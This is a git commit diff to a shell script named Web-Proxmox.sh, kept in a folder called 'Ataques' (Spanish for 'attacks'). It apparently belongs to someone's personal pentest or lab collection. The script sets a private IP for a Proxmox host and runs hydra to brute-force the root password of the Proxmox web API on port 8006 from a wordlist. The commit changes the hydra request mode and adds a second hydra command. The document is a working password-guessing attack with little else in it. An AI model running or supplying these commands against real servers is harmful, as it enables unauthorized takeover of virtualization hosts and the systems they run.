da8c6b29c8fcee816061c445584a342e23682ac9
NiPeGun <nipegun@gmail.com>
2025-01-28 08:26:20 +0100

    Update Web-Proxmox.sh

--- Ataques/Web-Proxmox.sh
+++ Ataques/Web-Proxmox.sh
@@ -2,4 +2,5 @@
 
 vIPDelProxmox="172.16.254.9"
 
-hydra -l root -P ~/diccionario.txt $vIPDelProxmox -s 8006 https-post-form "/api2/json/access/ticket:username=root&password=^PASS^:Invalid"
+hydra -l root -P ~/diccionario.txt $vIPDelProxmox -s 8006 https-get "/api2/json/access/ticket:username=root&password=^PASS^:Invalid"
+hydra -l root -P ~/diccionario.txt -s 8006 -m /api2/json/access/ticket https-get://$vIPDelProxmox
